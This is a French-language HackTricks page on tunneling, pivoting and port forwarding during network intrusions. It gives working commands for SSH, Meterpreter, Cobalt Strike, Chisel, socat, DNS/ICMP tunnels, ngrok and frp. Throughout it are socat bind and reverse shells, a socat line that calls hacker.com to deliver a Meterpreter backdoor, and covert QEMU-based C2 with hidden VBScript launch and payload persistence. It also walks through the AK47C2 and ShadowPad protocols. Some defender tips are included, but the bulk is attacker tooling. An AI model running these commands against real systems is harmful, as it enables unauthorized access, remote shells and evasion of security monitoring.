# Tunneling et Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Astuce Nmap

> [!WARNING]
> Les scans **ICMP** et **SYN** ne peuvent pas transiter par des proxies socks ; nous devons donc **désactiver la découverte par ping** (`-Pn`) et spécifier des **scans TCP** (`-sT`) pour que cela fonctionne.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Connexion graphique SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Ouvrir un nouveau port sur le serveur SSH --> Autre port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Port local --> Hôte compromis (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Port local --> Hôte compromis (SSH) --> N'importe où
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

C’est utile pour obtenir des reverse shells depuis des hôtes internes à travers une DMZ vers votre hôte :
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Vous avez besoin de **root sur les deux appareils** (puisque vous allez créer de nouvelles interfaces) et la configuration de sshd doit autoriser la connexion de root :\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Activer le forwarding côté serveur
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Définir une nouvelle route côté client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> L’attaque de downgrade Terrapin de 2023 peut permettre à un attaquant man-in-the-middle de falsifier les premières étapes de la négociation SSH et d’injecter des données dans **n’importe quel canal forwardé** ( `-L`, `-R`, `-D` ). Assurez-vous que le client et le serveur sont patchés (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou désactivez explicitement les algorithmes vulnérables `chacha20-poly1305@openssh.com` et `*-etm@openssh.com` dans `sshd_config`/`ssh_config` avant de vous fier aux tunnels SSH.

## SSHUTTLE

Vous pouvez **tunneler** via **ssh** tout le **trafic** vers un **sous-réseau** à travers un hôte.\
Par exemple, transférer tout le trafic destiné à 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Se connecter avec une clé privée
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Port local --> Hôte compromis (session active) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Une autre méthode :
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Ouvrir un port sur le teamserver, en écoute sur toutes les interfaces, qui peut être utilisé pour **acheminer le trafic via le beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Dans ce cas, le **port est ouvert sur l'hôte beacon**, et non sur le Team Server ; le trafic est envoyé au Team Server, puis de celui-ci vers l'hôte:port indiqué
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
À noter :

- Le reverse port forward de Beacon est conçu pour **tunneler le trafic vers le Team Server, et non pour effectuer un relais entre des machines individuelles**.
- Le trafic est **tunnelisé dans le trafic C2 de Beacon**, y compris les liens P2P.
- Les **privilèges d’administration ne sont pas requis** pour créer des reverse port forwards sur des ports élevés.

### rPort2Port local

> [!WARNING]
> Dans ce cas, le **port est ouvert sur le beacon host**, et non sur le Team Server, et le **trafic est envoyé au client Cobalt Strike** (et non au Team Server), puis de celui-ci vers l’hôte:port indiqué.
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Vous devez téléverser un fichier web tunnel : ashx|aspx|js|jsp|php|php|jsp.
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Vous pouvez le télécharger depuis la page des releases de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Vous devez utiliser la **même version pour le client et le serveur**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Utilisez la même version pour l’agent et le proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Liaison et écoute de l’agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Accéder aux ports locaux de l'agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Tunnel inversé. Le tunnel est démarré depuis la victime.\
Un proxy socks4 est créé sur 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivoter via **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port through socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter via SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Vous pouvez contourner un **proxy sans authentification** en exécutant cette ligne à la place de la dernière dans la console de la victime :
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Tunnel SSL Socat

**/bin/sh console**

Créez des certificats des deux côtés : Client et Serveur
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Connecter le port SSH local (22) au port 443 de l’hôte de l’attaquant
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

C'est une version console de PuTTY (les options sont très similaires à celles d'un client ssh).

Comme ce binaire sera exécuté sur la victime et qu'il s'agit d'un client ssh, nous devons ouvrir notre service et notre port ssh afin de pouvoir obtenir une connexion inverse. Ensuite, pour transférer un port accessible uniquement localement vers un port sur notre machine :
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Vous devez être administrateur local (pour n’importe quel port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Vous devez disposer d'un **accès RDP au système**.\
Téléchargez :

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise les `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité Remote Desktop Service de Windows. Les DVC sont responsables du **tunneling des paquets via la connexion RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Sur votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Nous pouvons maintenant **nous connecter** à la **victime** via **RDP** à l’aide de **`mstsc.exe`**, et nous devrions recevoir une **invite** indiquant que le **plugin SocksOverRDP est activé** et qu’il **écoutera** sur **127.0.0.1:1080**.

**Connectez-vous** via **RDP**, puis téléversez et exécutez le binaire `SocksOverRDP-Server.exe` sur la machine victime :
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Maintenant, vérifiez sur votre machine (attaquant) que le port 1080 est en écoute :
```
netstat -antb | findstr 1080
```
Vous pouvez maintenant utiliser [**Proxifier**](https://www.proxifier.com/) **pour faire transiter le trafic par ce port.**

## Proxify Windows GUI Apps

Vous pouvez faire naviguer les applications GUI Windows via un proxy à l’aide de [**Proxifier**](https://www.proxifier.com/).\
Dans **Profile -> Proxy Servers**, ajoutez l’adresse IP et le port du serveur SOCKS.\
Dans **Profile -> Proxification Rules**, ajoutez le nom du programme à proxifier ainsi que les connexions vers les IP que vous souhaitez proxifier.

## Contournement du proxy NTLM

L’outil mentionné précédemment : **Rpivot**\
**OpenVPN** peut également le contourner en définissant ces options dans le fichier de configuration :
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Il s’authentifie auprès d’un proxy et lie un port local qui est transféré vers le service externe que vous spécifiez. Vous pouvez ensuite utiliser l’outil de votre choix via ce port.\
Par exemple, transférer le port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Maintenant, si vous configurez par exemple le service **SSH** sur la victime pour qu’il écoute sur le port 443, vous pouvez vous y connecter via le port 2222 de l’attaquant.\
Vous pouvez également utiliser un **meterpreter** qui se connecte à localhost:443, tandis que l’attaquant écoute sur le port 2222.

## YARP

Un reverse proxy créé par Microsoft. Vous pouvez le trouver ici : [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root est nécessaire sur les deux systèmes pour créer des tun adapters et tunneler des données entre eux à l’aide de requêtes DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Le tunnel sera très lent. Vous pouvez créer une connexion SSH compressée à travers ce tunnel en utilisant :
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Téléchargez-le ici**](https://github.com/iagox86/dnscat2)**.**

Établit un canal C\&C via DNS. Il ne nécessite pas de privilèges root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Dans PowerShell**

Vous pouvez utiliser [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) pour exécuter un client dnscat2 dans PowerShell :
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding avec dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Changer le DNS de proxychains

Proxychains intercepte l'appel libc `gethostbyname` et tunnelise la requête DNS tcp via le socks proxy. Par **défaut**, le serveur **DNS** utilisé par proxychains est **4.2.2.2** (codé en dur). Pour le modifier, éditez le fichier : _/usr/lib/proxychains3/proxyresolv_ et changez l'IP. Si vous êtes dans un **environnement Windows**, vous pouvez définir l'IP du **contrôleur de domaine**.

## Tunnels en Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

L'acteur Storm-2603 a créé un **C2 à double canal ("AK47C2")** qui abuse *uniquement* du trafic **DNS** sortant et des requêtes **HTTP POST simples** – deux protocoles qui sont rarement bloqués sur les réseaux d'entreprise.<sup>[[2]](#references)</sup>

1. **Mode DNS (AK47DNS)**
• Génère un SessionID aléatoire de 5 caractères (par ex. `H4T14`).
• Ajoute `1` pour les *requêtes de tâches* ou `2` pour les *résultats*, puis concatène différents champs (flags, SessionID, nom de l'ordinateur).
• Chaque champ est **chiffré avec XOR à l'aide de la clé ASCII `VHBD@H`**, encodé en hexadécimal et assemblé avec des points – le tout se terminant par le domaine contrôlé par l'attaquant :

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Les requêtes utilisent `DnsQuery()` pour les enregistrements **TXT** (et les enregistrements **MG** en fallback).
• Lorsque la réponse dépasse 0xFF octets, le backdoor **fragmente** les données en morceaux de 63 octets et insère les marqueurs :
`s<SessionID>t<TOTAL>p<POS>` afin que le serveur C2 puisse les réordonner.

2. **Mode HTTP (AK47HTTP)**
• Construit une enveloppe JSON :
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• L'ensemble du blob est soumis à XOR avec `VHBD@H` → converti en hexadécimal → envoyé dans le corps d'un **`POST /`** avec l'en-tête `Content-Type: text/plain`.
• La réponse suit le même encodage et le champ `cmd` est exécuté avec `cmd.exe /c <command> 2>&1`.

Notes Blue Team
• Recherchez les **requêtes TXT** inhabituelles dont le premier label est un long hexadécimal et qui se terminent toujours par un domaine rare.
• Une clé XOR constante suivie d'ASCII hexadécimal est facile à détecter avec YARA : `6?56484244?484` (`VHBD@H` en hexadécimal).
• Pour HTTP, signalez les corps de requêtes POST `text/plain` qui sont uniquement composés de caractères hexadécimaux et dont la longueur est un multiple de deux octets.

{{#note}}
L'ensemble du canal tient dans des requêtes conformes aux standards **RFC** et conserve chaque label de sous-domaine sous 63 octets, ce qui le rend furtif dans la plupart des logs DNS.
{{#endnote}}

## Tunneling ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root est requis sur les deux systèmes pour créer des adaptateurs tun et tunneliser les données entre eux à l'aide de requêtes echo ICMP.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Téléchargez-le ici**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **est un outil permettant d'exposer des solutions sur Internet en une seule ligne de commande.**\
_Les URI d'exposition sont de la forme :_ **UID.ngrok.io**

### Installation

- Créer un compte : https://ngrok.com/signup
- Téléchargement du client :
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Usages de base

**Documentation :** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Il est également possible d’ajouter une authentification et TLS, si nécessaire._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Exposer des fichiers avec HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Useful for XSS,SSRF,SSTI ..._\
Directement depuis stdout ou dans l’interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling d’un service HTTP interne
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Exemple de configuration simple de ngrok.yaml

Il ouvre 3 tunnels :

- 2 TCP
- 1 HTTP avec exposition de fichiers statiques depuis /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Le daemon `cloudflared` peut créer des tunnels sortants qui exposent des **services TCP/UDP locaux** sans nécessiter de règles de pare-feu entrantes, en utilisant l’edge de Cloudflare comme point de rendez-vous. C’est très pratique lorsque le pare-feu de sortie n’autorise que le trafic HTTPS, mais que les connexions entrantes sont bloquées.

### One-liner de tunnel rapide
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### Pivot SOCKS5
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Tunnels persistants avec DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Démarrer le connecteur:
```bash
cloudflared tunnel run mytunnel
```
Comme tout le trafic quitte le **host** en **outbound via 443**, les tunnels Cloudflared constituent un moyen simple de contourner les ACL d’**ingress** ou les limites NAT. Sachez que le binaire s’exécute généralement avec des privilèges élevés : utilisez des conteneurs ou le flag `--user` lorsque c’est possible.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) est un reverse-proxy Go activement maintenu qui prend en charge **TCP, UDP, HTTP/S, SOCKS et le P2P NAT-hole-punching**. Depuis la **v0.53.0 (mai 2024)**, il peut agir comme une **SSH Tunnel Gateway** : un host cible peut donc établir un reverse tunnel en utilisant uniquement le client OpenSSH standard, sans binaire supplémentaire.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Utilisation de la nouvelle passerelle SSH (sans binaire frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
La commande ci-dessus publie le port **8080** de la victime sous la forme **attacker_ip:9000**, sans déployer d’outils supplémentaires – idéal pour le pivoting living-off-the-land.

## Tunnels discrets basés sur des VM avec QEMU

Le réseau en mode utilisateur de QEMU (`-netdev user`) prend en charge une option appelée `hostfwd` qui **attache un port TCP/UDP sur l’*hôte* et le redirige vers l’*invité***. Lorsque l’invité exécute un daemon SSH complet, la règle hostfwd vous fournit un jump box SSH jetable qui réside entièrement dans une VM éphémère – idéal pour dissimuler le trafic C2 à l’EDR, car toute l’activité et tous les fichiers malveillants restent sur le disque virtuel.<sup>[[1]](#references)</sup>

### Commande en une ligne
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• La commande ci-dessus lance une image **Tiny Core Linux** (`tc.qcow2`) en mémoire vive.
• Le port **2222/tcp** sur l’hôte Windows est transféré de manière transparente vers le port **22/tcp** à l’intérieur du guest.
• Du point de vue de l’attaquant, la cible expose simplement le port 2222 ; tous les paquets qui l’atteignent sont traités par le serveur SSH exécuté dans la VM.

### Lancement furtif via VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
L’exécution du script avec `cscript.exe //B update.vbs` garde la fenêtre masquée.

### Persistance dans l’invité

Comme Tiny Core est stateless, les attaquants procèdent généralement ainsi :

1. Déposer le payload dans `/opt/123.out`
2. Ajouter à `/opt/bootlocal.sh` :

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Ajouter `home/tc` et `opt` à `/opt/filetool.lst` afin que le payload soit inclus dans `mydata.tgz` lors de l’arrêt.

### Pourquoi cela échappe à la détection

• Seuls deux exécutables non signés (`qemu-system-*.exe`) écrivent sur le disque ; aucun driver ni service n’est installé.
• Les produits de sécurité sur l’hôte voient un **trafic loopback bénin** (le véritable C2 se termine à l’intérieur de la VM).
• Les memory scanners n’analysent jamais l’espace mémoire du processus malveillant, car celui-ci réside dans un autre OS.

### Conseils pour les defenders

• Déclencher une alerte en cas de présence de **binaires QEMU/VirtualBox/KVM inattendus** dans des chemins accessibles en écriture par l’utilisateur.
• Bloquer les connexions sortantes provenant de `qemu-system*.exe`.
• Rechercher les ports d’écoute rares (2222, 10022, …) qui sont liés immédiatement après le lancement de QEMU.

## Nœuds relais IIS/HTTP.sys via `HttpAddUrl` (ShadowPad)

Le module IIS de ShadowPad d’Ink Dragon transforme chaque serveur web de périmètre compromis en une **backdoor + relay** à double usage en liant des préfixes d’URL dissimulés directement au niveau de HTTP.sys :<sup>[[3]](#references)</sup>

* **Valeurs de configuration par défaut** – si la configuration JSON du module omet certaines valeurs, il utilise des valeurs par défaut IIS plausibles (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Ainsi, le trafic bénin reçoit une réponse d’IIS avec le branding correct.
* **Interception wildcard** – les opérateurs fournissent une liste de préfixes d’URL séparés par des points-virgules (wildcards dans l’hôte et le chemin). Le module appelle `HttpAddUrl` pour chaque entrée ; HTTP.sys achemine donc les requêtes correspondantes vers le handler malveillant *avant* que la requête n’atteigne les modules IIS.
* **Premier paquet chiffré** – les deux premiers octets du corps de la requête contiennent la seed d’un PRNG personnalisé de 32 bits. Chaque octet suivant est soumis à un XOR avec le keystream généré avant l’analyse du protocole :

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Orchestration du relay** – le module gère deux listes : les « servers » (nœuds en amont) et les « clients » (implants en aval). Les entrées sont supprimées si aucun heartbeat n’est reçu pendant environ 30 secondes. Lorsque les deux listes ne sont pas vides, il associe le premier server sain au premier client sain et transfère simplement les octets entre leurs sockets jusqu’à ce qu’un côté se ferme.
* **Télémétrie de debug** – une journalisation facultative enregistre l’adresse IP source, l’adresse IP de destination et le nombre total d’octets transférés pour chaque association. Les enquêteurs ont utilisé ces traces pour reconstituer le mesh ShadowPad reliant plusieurs victimes.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
